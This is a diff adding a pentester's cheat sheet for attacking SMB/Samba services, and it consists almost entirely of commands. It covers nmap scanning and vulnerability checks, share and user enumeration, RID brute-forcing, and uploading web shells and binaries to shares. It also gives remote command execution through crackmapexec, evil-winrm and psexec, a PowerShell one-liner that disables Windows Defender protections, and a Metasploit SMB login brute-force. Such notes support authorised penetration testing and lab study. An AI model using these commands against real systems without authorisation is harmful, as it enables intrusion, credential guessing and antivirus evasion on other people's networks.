@@ -1,0 +1,96 @@
+### samba SMB ###
+## links ##
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+
+##########
+## nmap ##
+##########
+ls -1 /usr/share/nmap/scripts/smb*                                      	# many nmap script for smb
+nmap -v -p 139,445 --script smb-os-discovery $h			             	# work inly with SMBv1
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $h
+nmap -p 445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $h
+# network
+nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254                         	# scan network for opened SMB
+	grep open smb.txt | cut -d " " -f2
+sudo nbtscan -r 192.168.50.0/24                                         	# query NetBIOS UDP:137
+
+
+##########
+## enum ##
+##########
+smbmap -H $h									# connect
+smbmap -u guest -H $h								# connect with user guest
+smbmap -u anonymous -H $h							# connect with user anonymous
+smbmap -H $h -d $d -u USER -p PASS	 					# connect with domain and user/pass
+smbmap -H $h -d $d -u USER -p PASS -R						# recurse list dir/files
+enum4linux -a $h								# all simple enum
+enum4linux -A $h								# agressive, check write
+enum4linux -U $h								# userlist
+msfconsole -q -x 'use scanner/smb/smb_version; set RHOSTS {h}; run; exit'	# msf consoleless version
+msfconsole -q -x 'use scanner/smb/smb_enumshares; set RHOSTS {h}; run; exit'	# enumshares
+
+# windows
+net view \\dc01 /all                                                    	# list all shares on dc01
+
+
+###############
+## enum user ##
+###############
+lookupsid.py -no-pass hostname.local
+lookupsid.py guest@$h
+msfconsole -q -x 'use auxiliary/scanner/smb/smb_lookupsid; set RHOSTS {h}; run; exit'
+crackmapexec smb $h -u 'a' -p '' -d $d --rid-brute
+
+
+#############
+## connect ##
+#############
+smbclient.py $h
+smbclient.py guest@$h
+# open ip
+# login anonymous
+# shares			# list all shares
+# use name
+# ls
+# get file.ext			# download a file
+# put shell.aspx		# upload a file
+
+# connect with user
+smbclient.py -U USER '//$h/Share'
+smbclient -U Anonymous '//192.168.121.10/Users'				# example
+smbclient -p 445 -L //$h/ -U hr_admin --password=Welcome1234		# list available shares
+smbclient -p 445 //$h/scripts -U hr_admin --password=Welcome1234	# co to a share
+smbclient -p 445 //$h/scripts -U domain/user --password=xxxx		# with domain
+# recurse get a folder
+smbclient -p 445 //$h/scripts -U hr_admin --password=Welcome1234
+> mask ""
+> recurse ON
+> prompt OFF
+> cd 'path\to\remote\dir'
+> lcd '~/path/to/download/to/'
+> mget *
+> put bin.exe								# upload a bin
+
+
+
+##########
+## exec ##
+##########
+crackmapexec smb $h -u USER -p PASS -d $d -x "whoami /all"	# exec cmd, check privs
+evil-winrm -u USER -p PASS -i $h				# need some administrative capabilities
+	# maybe could disable anti-virus
+	C:\ Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true
+psexec.py $d/user:pass@$h					# need write access and maybe anti-virus desactivated
+
+
+################
+## bruteforce ##
+################
+msfconsole
+> use scanner/smb/smb_login
+> set SMBUser ...
+> set PASS_FILE ...
+> run
+
+
